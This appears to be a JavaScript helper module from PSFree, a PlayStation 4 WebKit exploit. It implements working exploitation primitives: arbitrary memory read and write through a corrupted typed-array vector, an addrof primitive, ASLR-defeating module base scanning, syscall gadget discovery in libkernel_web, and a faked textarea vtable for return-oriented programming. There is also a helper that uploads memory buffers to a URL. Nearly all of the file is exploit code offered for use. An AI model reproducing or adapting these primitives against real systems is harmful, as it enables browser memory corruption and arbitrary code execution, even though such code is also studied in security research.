/* Copyright (C) 2023-2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import { Int, lohi_from_one, view_m_vector, view_m_length, KB, page_size } from './offset.js';

export class DieError extends Error {
    constructor(...args) {
        super(...args);
        this.name = this.constructor.name;
    }
}

export function die(msg='') {
    throw new DieError(msg);
}

// const console = document.getElementById('console');
// export function debug_log(msg='') {
//     console.append(msg + '\n');
// }
//export const debug_log = (string) => log(string, LogLevel.LOG);
export const debug_log = print; 
window.debug_log = debug_log;

export function clear_log() {
    // console.innerHTML = null;
}

export function str2array(str, length, offset) {
    if (offset === undefined) {
        offset = 0;
    }
    let a = new Array(length);
    for (let i = 0; i < length; i++) {
        a[i] = str.charCodeAt(i + offset);
    }
    return a;
}

// alignment must be 32 bits and is a power of 2
export function align(a, alignment) {
    if (!(a instanceof Int)) {
        a = new Int(a);
    }
    const mask = -alignment & 0xffffffff;
    let type = a.constructor;
    let low = a.low & mask;
    return new type(low, a.high);
}

export async function send(url, buffer, file_name, onload=() => {}) {
    const file = new File(
        [buffer],
        file_name,
        {type:'application/octet-stream'}
    );
    const form = new FormData();
    form.append('upload', file);

    debug_log('send');
    const response = await fetch(url, {method: 'POST', body: form});

    if (!response.ok) {
        throw Error(`Network response was not OK, status: ${response.status}`);
    }
    onload();
}

// mostly used to yield to the GC. marking is concurrent but collection isn't
//
// yielding also lets the DOM update. which is useful since we use the DOM for
// logging and we loop when waiting for a collection to occur
export function sleep(ms=0) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

export function hex(number) {
    return '0x' + number.toString(16);
}

// no "0x" prefix
export function hex_np(number) {
    return number.toString(16);
}

export class BufferView extends Uint8Array {
    constructor(...args) {
        super(...args);
        this._dview = new DataView(this.buffer);
    }

    read16(offset) {
        return this._dview.getUint16(offset, true);
    }

    read32(offset) {
        return this._dview.getUint32(offset, true);
    }

    read64(offset) {
        return new Int(
            this._dview.getUint32(offset, true),
            this._dview.getUint32(offset + 4, true),
        );
    }

    write16(offset, value) {
        this._dview.setUint16(offset, value, true);
    }

    write32(offset, value) {
        this._dview.setUint32(offset, value, true);
    }

    write64(offset, value) {
        const values = lohi_from_one(value)
        this._dview.setUint32(offset, values[0], true);
        this._dview.setUint32(offset + 4, values[1], true);
    }
}

// WARNING: These functions are now deprecated. use BufferView instead.

// view.buffer is the underlying ArrayBuffer of a TypedArray, but since we will
// be corrupting the m_vector of our target views later, the ArrayBuffer's
// buffer will not correspond to our fake m_vector anyway.
//
// can't use:
//
// function read32(u8_view, offset) {
//     let res = new Uint32Array(u8_view.buffer, offset, 1);
//     return res[0];
// }
//
// to implement read32, we need to index the view instead:
//
// function read32(u8_view, offset) {
//     let res = 0;
//     for (let i = 0; i < 4; i++) {
//         res += u8_view[offset + i] << i*8;
//     }
//     // << returns a signed integer, >>> converts it to unsigned
//     return res >>> 0;
// }

// for reads less than 8 bytes
function read(u8_view, offset, size) {
    let res = 0;
    for (let i = 0; i < size; i++) {
        res += u8_view[offset + i] << i*8;
    }
    // << returns a signed integer, >>> converts it to unsigned
    return res >>> 0;
}

export function read16(u8_view, offset) {
    return read(u8_view, offset, 2);
}

export function read32(u8_view, offset) {
    return read(u8_view, offset, 4);
}

export function read64(u8_view, offset) {
    return new Int(read32(u8_view, offset), read32(u8_view, offset + 4));
}

// for writes less than 8 bytes
function write(u8_view, offset, value, size) {
    for (let i = 0; i < size; i++) {
        u8_view[offset + i]  = (value >>> i*8) & 0xff;
    }
}

export function write16(u8_view, offset, value) {
    write(u8_view, offset, value, 2);
}

export function write32(u8_view, offset, value) {
    write(u8_view, offset, value, 4);
}

export function write64(u8_view, offset, value) {
    if (!(value instanceof Int)) {
        throw TypeError('write64 value must be an Int');
    }

    let low = value.low;
    let high = value.high;

    for (let i = 0; i < 4; i++) {
        u8_view[offset + i]  = (low >>> i*8) & 0xff;
    }
    for (let i = 0; i < 4; i++) {
        u8_view[offset + 4 + i]  = (high >>> i*8) & 0xff;
    }
}

export let mem = null;

// cache some constants
const off_vector = view_m_vector / 4;
const off_vector2 = (view_m_vector + 4) / 4;
const isInteger = Number.isInteger;

function init_module(memory) {
    mem = memory;
}

function add_and_set_addr(mem, offset, base_lo, base_hi) {
    const values = lohi_from_one(offset);
    const main = mem._main;

    const low = base_lo + values[0];

    // no need to use ">>> 0" to convert to unsigned here
    main[off_vector] = low;
    main[off_vector2] = base_hi + values[1] + (low > 0xffffffff);
}

export class Addr extends Int {
    read8(offset) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        return m.read8_at(offset);
    }

    read16(offset) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        return m.read16_at(offset);
    }

    read32(offset) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        return m.read32_at(offset);
    }

    read64(offset) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        return m.read64_at(offset);
    }

    readp(offset) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        return m.readp_at(offset);
    }

    write8(offset, value) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        m.write8_at(offset, value);
    }

    write16(offset, value) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        m.write16_at(offset, value);
    }

    write32(offset, value) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        m.write32_at(offset, value);
    }

    write64(offset, value) {
        const m = mem;
        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
            m._set_addr_direct(this);
        } else {
            add_and_set_addr(m, offset, this.low, this.high);
            offset = 0;
        }

        m.write64_at(offset, value);
    }
}

// expected:
// * main - Uint32Array whose m_vector points to worker
// * worker - DataView
//
// addrof() expectations:
// * obj - we will store objects at .addr
// * addr_addr - Int where to read out the address. the address used to store
//   the value of .addr
//
// the relative read/write methods expect the offset to be a unsigned 32-bit
// integer
export class Memory {
    constructor(main, worker, obj, addr_addr)  {
        this._main = main;
        this._worker = worker;
        this._obj = obj;
        this._addr_low = addr_addr.low;
        this._addr_high = addr_addr.high;

        main[view_m_length / 4] = 0xffffffff;

        init_module(this);
    }

    addrof(object) {
        // typeof considers null as a object. blacklist it as it isn't a
        // JSObject
        if ((typeof object !== 'object' || object === null)
            && typeof object !== 'function'
        ) {
            throw TypeError('argument not a JS object');
        }

        const obj = this._obj;
        const worker = this._worker;
        const main = this._main;

        obj.addr = object;

        main[off_vector] = this._addr_low;
        main[off_vector2] = this._addr_high;

        const res = new Addr(
            worker.getUint32(0, true),
            worker.getUint32(4, true),
        );
        obj.addr = null;

        return res;
    }

    // expects addr to be a Int
    _set_addr_direct(addr) {
        const main = this._main;
        main[off_vector] = addr.low;
        main[off_vector2] = addr.high;
    }

    set_addr(addr) {
        const values = lohi_from_one(addr);
        const main = this._main;
        main[off_vector] = values[0];
        main[off_vector2] = values[1];
    }

    get_addr() {
        return new Addr(main[off_vector], main[off_vector2]);
    }

    read8(addr) {
        this.set_addr(addr);
        return this._worker.getUint8(0);
    }

    read16(addr) {
        this.set_addr(addr);
        return this._worker.getUint16(0, true);
    }

    read32(addr) {
        this.set_addr(addr);
        return this._worker.getUint32(0, true);
    }

    read64(addr) {
        this.set_addr(addr);
        const worker = this._worker;
        return new Int(worker.getUint32(0, true), worker.getUint32(4, true));
    }

    // returns a pointer instead of an Int
    readp(addr) {
        this.set_addr(addr);
        const worker = this._worker;
        return new Addr(worker.getUint32(0, true), worker.getUint32(4, true));
    }

    read8_at(offset) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        return this._worker.getUint8(offset);
    }

    read16_at(offset) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        return this._worker.getUint16(offset, true);
    }

    read32_at(offset) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        return this._worker.getUint32(offset, true);
    }

    read64_at(offset) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        const worker = this._worker;
        return new Int(
            worker.getUint32(offset, true),
            worker.getUint32(offset + 4, true),
        );
    }

    readp_at(offset) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        const worker = this._worker;
        return new Addr(
            worker.getUint32(offset, true),
            worker.getUint32(offset + 4, true),
        );
    }

    // writes using 0 as a base address don't work because we are using a
    // DataView as a worker. work around this by doing something like "new
    // Addr(-1, -1).write8(1, 0)"
    //
    // see setIndex() from
    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
    // 8.00

    write8(addr, value) {
        this.set_addr(addr);
        this._worker.setUint8(0, value);
    }

    write16(addr, value) {
        this.set_addr(addr);
        this._worker.setUint16(0, value, true);
    }

    write32(addr, value) {
        this.set_addr(addr);
        this._worker.setUint32(0, value, true);
    }

    write64(addr, value) {
        const values = lohi_from_one(value);
        this.set_addr(addr);
        const worker = this._worker;
        worker.setUint32(0, values[0], true);
        worker.setUint32(4, values[1], true);
    }

    write8_at(offset, value) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        this._worker.setUint8(offset, value);
    }

    write16_at(offset, value) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        this._worker.setUint16(offset, value, true);
    }

    write32_at(offset, value) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        this._worker.setUint32(offset, value, true);
    }

    write64_at(offset, value) {
        if (!isInteger(offset)) {
            throw TypeError('offset not a integer');
        }
        const values = lohi_from_one(value);
        const worker = this._worker;
        worker.setUint32(offset, values[0], true);
        worker.setUint32(offset + 4, values[1], true);
    }
}

export function make_buffer(addr, size) {
    // see enum TypedArrayMode from
    // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
    // at webkitgtk 2.34.4
    //
    // see possiblySharedBuffer() from
    // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
    // at webkitgtk 2.34.4

    // We will create an OversizeTypedArray via requesting an Uint8Array whose
    // number of elements will be greater than fastSizeLimit (1000).
    //
    // We will not use a FastTypedArray since its m_vector is visited by the
    // GC and we will temporarily change it. The GC expects addresses from the
    // JS heap, and that heap has metadata that the GC uses. The GC will likely
    // crash since valid metadata won't likely be found at arbitrary addresses.
    //
    // The FastTypedArray approach will have a small time frame where the GC
    // can inspect the invalid m_vector field.
    //
    // Views created via "new TypedArray(x)" where "x" is a number will always
    // have an m_mode < WastefulTypedArray.
    const u = new Uint8Array(1001);
    const u_addr = mem.addrof(u);

    // we won't change the butterfly and m_mode so we won't save those
    const old_addr = u_addr.read64(o.view_m_vector);
    const old_size = u_addr.read32(o.view_m_length);

    u_addr.write64(o.view_m_vector, addr);
    u_addr.write32(o.view_m_length, size);

    const copy = new Uint8Array(u.length);
    copy.set(u);

    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
    // associated with them, if we ask for view.buffer, the view will be
    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
    // This is done by calling slowDownAndWasteMemory().
    //
    // We can't use slowDownAndWasteMemory() on u since that will create a
    // JSC::ArrayBufferContents with its m_data pointing to addr. On the
    // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
    // cause a crash if the m_data is not from the fastMalloc heap, and even if
    // it is, freeing abitrary addresses is dangerous as it may lead to a
    // use-after-free.
    const res = copy.buffer;

    // restore
    u_addr.write64(o.view_m_vector, old_addr);
    u_addr.write32(o.view_m_length, old_size);

    return res;
}

// these values came from analyzing dumps from CelesteBlue
function check_magic_at(p, is_text) {
    // byte sequence that is very likely to appear at offset 0 of a .text
    // segment
    const text_magic = [
        new Int([0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56]),
        new Int([0x41, 0x55, 0x41, 0x54, 0x53, 0x50, 0x48, 0x8d]),
    ];

    // the .data "magic" is just a portion of the PT_SCE_MODULE_PARAM segment

    // .data magic from 3.00, 6.00, and 6.20
    //const data_magic = [
    //    new Int(0x18),
    //    new Int(0x3c13f4bf, 0x1),
    //];

    // .data magic from 8.00 and 8.03
    const data_magic = [
        new Int(0x20),
        new Int(0x3c13f4bf, 0x2),
    ];

    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)];

    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
}

// Finds the base address of a segment: .text or .data
// Used on the ps4 to locate module base addresses
// * p:
//     an address pointing somewhere in the segment to search
// * is_text:
//     whether the segment is .text or .data
// * is_back:
//     whether to search backwards (to lower addresses) or forwards
//
// Modules are likely to be separated by a couple of unmapped pages because of
// Address Space Layout Randomization (all module base addresses are
// randomized). This means that this function will either succeed or crash on
// a page fault, if the magic is not present.
//
// To be precise, modules are likely to be "surrounded" by unmapped pages, it
// does not mean that the distance between a boundary of a module and the
// nearest unmapped page is 0.
//
// The boundaries of a module is its base and end addresses.
//
// let module_base_addr = find_base(...);
// // Not guaranteed to crash, the nearest unmapped page is not necessarily at
// // 0 distance away from module_base_addr.
// addr.read8(-1);
//
export function find_base(addr, is_text, is_back) {
    // align to page size
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;
    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset)
    }
    return addr;
}

// gets the address of the underlying buffer of a JSC::JSArrayBufferView
export function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) {
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    return mem.addrof(view).readp(o.view_m_vector);
}

export function resolve_import(import_addr) {
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(
            `instruction at ${import_addr} is not of the form: jmp qword`
            + ' [rip + X]'
        );
    }
    // module_function_import:
    //     jmp qword [rip + X]
    //     ff 25 xx xx xx xx // signed 32-bit displacement
    const disp = import_addr.read32(2);
    // sign extend
    const offset = new Int(disp, disp >> 31);
    // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
    // of the next instruction. This means that the actual address used is
    // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
    // jump instruction, which is 6 in this case.
    const function_addr = import_addr.readp(offset.add(6));

    return function_addr;
}

export function init_syscall_array(
    syscall_array,
    libkernel_web_base,
    max_search_size,
) {
    if (!Number.isInteger(max_search_size)) {
        throw TypeError(
            `max_search_size is not a integer: ${max_search_size}`
        );
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }

    const libkernel_web_buffer = make_buffer(
        libkernel_web_base,
        max_search_size,
    );
    const kbuf = new Uint8Array(libkernel_web_buffer);

    // Search 'rdlo' string from libkernel_web's .rodata section to gain an
    // upper bound on the size of the .text section.
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        if (kbuf[i] === 0x72
            && kbuf[i + 1] === 0x64
            && kbuf[i + 2] === 0x6c
            && kbuf[i + 3] === 0x6f
        ) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(
            '"rdlo" string not found in libkernel_web, base address:'
            + ` ${libkernel_web_base}`
        );
    }

    // search for the instruction sequence:
    // syscall_X:
    //     mov rax, X
    //     mov r10, rcx
    //     syscall
    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48
            && kbuf[i + 1] === 0xc7
            && kbuf[i + 2] === 0xc0
            && kbuf[i + 7] === 0x49
            && kbuf[i + 8] === 0x89
            && kbuf[i + 9] === 0xca
            && kbuf[i + 10] === 0x0f
            && kbuf[i + 11] === 0x05
        ) {
            const syscall_num = read32(kbuf, i + 3);
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            // skip the sequence
            i += 11;
        }
    }
}

// textarea object cloned by create_ta_clone()
const rop_ta = document.createElement('textarea');

// Creates a helper object for ROP using the textarea vtable method
//
// Args:
//   obj:
//     Object to attach objects that need to stay alive in order for the clone
//     to work.
//
// Returns:
//   The address of the clone.
export function create_ta_clone(obj) {
    // sizeof JSC:JSObject, the JSCell + the butterfly field
    const js_size = 0x10;
    // start of the array of inline properties (JSValues)
    const offset_js_inline_prop = 0x10;
    // Sizes may vary between webkit versions so we just assume a size
    // that we think is large enough for all of them.
    const vtable_size = 0x1000;
    const webcore_ta_size = 0x180;

    // Empty objects have 6 inline properties that are not inspected by the
    // GC. This gives us 48 bytes of free space that we can write with
    // anything.
    const ta_clone = {};
    obj.ta_clone = ta_clone;
    const clone_p = mem.addrof(ta_clone);
    const ta_p = mem.addrof(rop_ta);

    // Copy the contents of the textarea before copying the JSCell. As long
    // the JSCell is of an empty object, the GC will not inspect the inline
    // storage.
    //
    // MarkedBlocks serve memory in fixed-size chunks (cells). The chunk
    // size is also called the cell size. Even if you request memory whose
    // size is less than a cell, the entire cell is allocated for the
    // object.
    //
    // The cell size of the MarkedBlock where the empty object is allocated
    // is atleast 64 bytes (enough to fit the empty object). So even if we
    // change the JSCell later and the perceived size of the object
    // (size_jsta) is less than 64 bytes, we don't have to worry about the
    // memory area between clone_p + size_jsta and clone_p + cell_size
    // being freed and reused because the entire cell belongs to the object
    // until it dies.
    for (let i = js_size; i < o.size_jsta; i += 8) {
        clone_p.write64(i, ta_p.read64(i));
    }

    // JSHTMLTextAreaElement is a subclass of JSC::JSDestructibleObject and
    // thus they are allocated on a MarkedBlock with special attributes
    // that tell the GC to have their destructor clean their storage on
    // their death.
    //
    // The destructor in this case will destroy m_wrapped since they are a
    // subclass of WebCore::JSDOMObject as well.
    //
    // What's great about the clones (initially empty objects) is that they
    // are instances of JSC::JSFinalObject. That type doesn't have a
    // destructor and so they are allocated on MarkedBlocks that don't need
    // destruction.
    //
    // So even if a clone dies, the GC will not look for a destructor and
    // try to run it. This means we can fake m_wrapped and not fear of any
    // sort of destructor being called on it.

    const webcore_ta = ta_p.readp(o.jsta_impl);
    const m_wrapped_clone = new Uint8Array(
        make_buffer(webcore_ta, webcore_ta_size)
    );
    obj.m_wrapped_clone = m_wrapped_clone;

    // Replicate the vtable as much as possible or else the garbage
    // collector will crash. It uses functions from the vtable.
    const vtable_clone = new Uint8Array(
        make_buffer(webcore_ta.readp(0), vtable_size)
    );
    obj.vtable_clone = vtable_clone

    clone_p.write64(
        o.jsta_impl,
        get_view_vector(m_wrapped_clone),
    );
    rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));

    // turn the empty object into a textarea (copy JSCell header)
    //
    // Don't need to copy the butterfly since it's by default NULL and it
    // doesn't have any special meaning for the JSHTMLTextAreaObject type,
    // unlike other types that uses it for something else.
    //
    // An example is a JSArrayBufferView with m_mode >= WastefulTypedArray,
    // their *(butterfly - 8) is a pointer to a JSC::ArrayBuffer.
    clone_p.write64(0, ta_p.read64(0));

    return clone_p;
}
window.create_ta_clone = create_ta_clone;
